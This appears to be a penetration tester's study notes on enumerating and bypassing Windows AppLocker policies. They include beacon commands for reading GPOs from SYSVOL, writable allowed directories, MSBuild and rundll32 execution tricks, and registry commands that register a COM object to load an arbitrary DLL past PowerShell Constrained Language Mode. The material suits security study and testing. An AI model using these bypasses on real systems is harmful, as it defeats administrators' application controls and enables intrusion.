AppLocker is an application control technology built into Windows to prevent users from running applications not approved by policy
each policy contains one or more enforcement rules, and each rule contains a permission and a condition
    permissions define the action (allow or deny) and the user/group to which the rule applies
    conditions define the rule itself, can be based on published, path, and/or file hash
these policies are defined by system admins and deployed via GPOs or Intune

enumeration of policies
    via registry
        useful when we already have console access to a protected machine
            PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
            PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
    native applocker cmdlet
        PS C:\Users\pchilds> $policy = Get-AppLockerPolicy -Effective
        PS C:\Users\pchilds> $policy.RuleCollections
    via GPOs
        useful when we have a beacon running on an unprotected machine, and trying to move laterally to protected machine
        we can walk through each container in SYSVOL and look for Registry.pol in the Machine dir
             beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
                --------------------
                displayName: AppLocker
                gPCFileSysPath: \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}
                --------------------
            beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine
            beacon> download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
        once we sync the file to our desktop we can read using parse-polfile cmdlet
            PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol

bypassing policies
    path wildcards
        there may be custom rules that allow execution from a specified directory but used overpermissive wildcards
            e.g. 	<FilePathCondition Path="*\App-V\*"/>
                    this now allows any executable to run in any directory named App-V
    writeable directories
        there are several directories that exist within the default allowed path for many of the rules
        simply drop the executable in here and it will be allowed to run
            example directories:
                C:\Windows\Tasks
                C:\Windows\Temp 
                C:\windows\tracing
                C:\Windows\System32\spool\PRINTERS
                C:\Windows\System32\spool\SERVERS
                C:\Windows\System32\spool\drivers\color
    LOLBAS (https://lolbas-project.github.io/)
        some LOLBAS that are able to execute arbitrary code exist in an allowlisted space such as %WINDIR%\*
        MSBuild allows us to execute arbitrary C# code from a .csproj file (example in msbuild_LOLBAS.csproj)
    powershell CLM
        applocker will change powershell language mode from FUllLanguage to ConstrainedLanguage
        verify this
            PS C:\Users\pchilds> $ExecutionContext.SessionState.LanguageMode
        however we can still use New-Object to load COM objects such as WScript.Shell
        using this we can create a new COM object that will load an arbitrary DLL
            PS C:\Users\pchilds> New-Object -ComObject WScript.Shell
            PS C:\Users\pchilds> [System.Guid]::NewGuid()
            C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
            C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
            C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
    rundll32
        DLL rules are rarely enabled due to performance concerns
        so we can use rundll32 to load arbitrary DLLs
            e.g. C:\Users\pchilds\Desktop> rundll32 bypass.dll,execute 
                NOTE: the beacon DLL payload is specficially crafted to be called from rundll32

